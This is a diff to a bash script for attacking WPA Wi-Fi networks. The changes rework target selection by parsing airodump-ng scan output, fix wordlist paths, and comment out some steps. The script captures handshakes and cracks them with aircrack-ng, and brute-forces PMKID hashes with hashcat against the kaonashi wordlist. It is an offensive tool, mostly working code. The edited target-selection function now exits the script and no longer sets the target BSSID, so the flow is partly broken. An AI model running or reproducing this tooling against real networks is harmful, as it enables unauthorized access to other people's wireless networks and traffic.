@@ -98,7 +98,8 @@ function check_kaonashi(){
 }
 
 function dependencies(){
-    clear; programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)
+    #clear;
+    programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)
 
     echo -e "\n${yellow}[*]${nc} Checking dependencies...\n"
     sleep 2
@@ -139,15 +140,41 @@ function dependencies(){
 }
 
 function select_target_network(){
-    xterm -hold -e "airodump-ng ${network_card}"&
+    xterm -hold -e "airodump-ng ${network_card} -w airodump-dump --write-interval 1"&
     airodump_xterm_pid=$!
 
-    echo -e "\n${yellow}[*]${nc} Select the target network"
-
-    echo -ne "${yellow}[*]${nc} Enter the BSSID of the target network: " && read ap_bssid
-    echo -ne "${yellow}[*]${nc} Enter the channel of the target network: " && read ap_channel
-
+    echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan with ${red}enter${nc}"
+    wait_for_confirmation
     kill -9 $airodump_xterm_pid; wait $airodump_xterm_pid &>/dev/null
+
+    networks="|________BSSID_______|________ESSID_______|CHANNEL|POWER|,"
+    while IFS=, read -r bssid first_time last_time channel speed privacy cipher authentication power beacons iv lan_ip id_length essid key; do
+        if [[ $bssid != "BSSID" ]] && [[ $bssid != "" ]] && [[ $essid != "" ]]; then
+            parsed_essid=$(echo ${essid} | sed 's/\<//' | sed 's/\>//')
+            length_essid=$(echo ${parsed_essid} | wc -c)
+            if [ $length_essid -lt 20 ]; then
+                parsed_essid="${parsed_essid}$(printf '%*s' $(( 20-$length_essid )))"
+                echo $parsed_essid
+            fi
+            networks="${networks}| ${bssid} | ${parsed_essid::18} |${channel}|${power}|,"
+        fi
+    done < airodump-dump-01.csv
+
+    echo $networks > airodump-dump-01.parsed
+
+    echo -e "\n${yellow}[*]${nc} Scanned networks"
+    PS3="[*] Select the target network: "
+    IFS=,
+    select target_network in $(cat airodump-dump-01.parsed); do
+        if [[ $target_network == "" ]]; then
+            echo -e "${red}[-]${nc} Invalid option"
+            select_target_network
+        else
+            break
+        fi
+    done
+    rm -rf airodump*
+    exit_script
 }
 
 function handshake(){
@@ -200,7 +227,7 @@ function handshake(){
         mkdir -p handshakes
         mv capture_* handshakes/
 
-        xterm -hold -e "aircrack-ng -w /usr/share/wordlist/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
+        xterm -hold -e "aircrack-ng -w /usr/share/wordlists/kaonashiWPA100M.txt handshakes/capture_${ap_bssid}-01.cap" &
         aircrack_xterm_pid=$!
         echo -e "\n${yellow}[*]${nc} Cracking handshake..."
         echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
@@ -236,7 +263,7 @@ function pmkid(){
 
         echo -e "\n${yellow}[*]${nc} Initiating brute-force attack..."
         sleep 1
-        xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlist/kaonashiWPA100M.txt" &
+        xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlists/kaonashiWPA100M.txt" &
         hashcat_xterm_pid=$!
         echo -e "\n${yellow}[!]${nc} Remember to kill the process when you finished"
         echo -e "${yellow}[!]${nc} sudo kill -9 $hashcat_xterm_pid"
@@ -254,9 +281,7 @@ function pmkid(){
 }
 
 function attack(){
-    we_attack=0
-    clear
-
+    #clear
     choose_card
 
     echo -e "${starting}(_!_)${nc} Starting attack (attack_mode=$attack_mode || network_card=$network_card )\n"
@@ -297,6 +322,7 @@ function choose_card(){
         sleep 1
         break
     done
+    we_attack=0
 }
 
 function wait_for_confirmation(){
@@ -321,12 +347,13 @@ done
 
 
 if [ "$(id -u)" == "0" ]; then
+
     if [ -z "$attack_mode" ]; then
         echo -e "Missing arguments!\n"
         help_panel
     fi
 
-    dependencies
+    #dependencies
     attack
 
     exit_script
